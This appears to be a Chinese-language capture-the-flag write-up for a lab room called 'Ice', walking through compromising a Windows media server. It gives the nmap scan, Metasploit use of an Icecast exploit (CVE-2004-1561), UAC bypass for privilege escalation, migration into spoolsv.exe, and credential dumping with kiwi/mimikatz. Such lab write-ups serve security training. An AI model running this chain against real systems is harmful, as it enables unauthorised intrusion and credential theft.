# Ice

部署并入侵Windows机器，利用安全性非常低的媒体服务器。

---

循例 nmap扫

    nmap -sS 10.10.163.66 -Pn -p- -T5

.

    135/tcp   open  msrpc
    139/tcp   open  netbios-ssn
    445/tcp   open  microsoft-ds
    3389/tcp  open  ms-wbt-server
    5357/tcp  open  wsdapi
    8000/tcp  open  http-alt
    49152/tcp open  unknown
    49153/tcp open  unknown
    49154/tcp open  unknown
    49158/tcp open  unknown
    49159/tcp open  unknown
    49160/tcp open  unknown

想要回答题目的问题只需加 -sV -sC即可

寻找icecast相关cve:

    CVE-2004-1561

开启metasploit

    search CVE-2004-1561
    use 0

设置相关参数并运行

### 权限提升

在meterpreter下运行post模块的内核漏洞扫描：

    run post/multi/recon/local_exploit_suggester

metasploit返回了几个存在的漏洞，我们寻找能够帮助我们提权的：

    exploit/windows/local/bypassuac_eventvwr

background后台运行

    use exploit/windows/local/bypassuac_eventvwr
    show options
    sessions -l
    set session 2
    set lhost ...
    set lport ...
    exploit

在meterpreter下运行：getprivs

我们可以看到拥有许多特权

### 凭据收集

转储到打印机进程：

    migrate -N spoolsv.exe

此时我们将获得system权限

加载kiwi模块（mimikatz合并到了此模块中）

    load kiwi
    help
    creds_all

即可获得所有凭据

题目的问题可以自行查阅meterpreter shell的help
